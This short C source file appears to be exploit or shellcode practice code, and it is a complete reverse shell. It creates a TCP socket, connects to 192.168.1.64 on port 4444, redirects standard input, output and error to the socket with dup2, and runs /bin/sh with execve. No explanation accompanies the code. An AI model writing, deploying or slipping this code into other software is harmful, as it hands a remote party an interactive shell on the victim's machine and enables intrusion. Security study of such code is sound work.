#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(int argc, char *argv[]){
	
	// AF_INET = 2;		SOCK_STREAM = 1
	int fd = 0;
	fd = socket(AF_INET, SOCK_STREAM, 0);
		
	struct sockaddr_in serv_addr; 
	serv_addr.sin_family = AF_INET;
    	serv_addr.sin_addr.s_addr = inet_addr("192.168.1.64");
    	serv_addr.sin_port = htons(4444); 

	connect(fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 


	// redirect stdin, stdout, stderr
	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2); 

	// run program
	execve("/bin/sh", NULL, NULL);
	
}
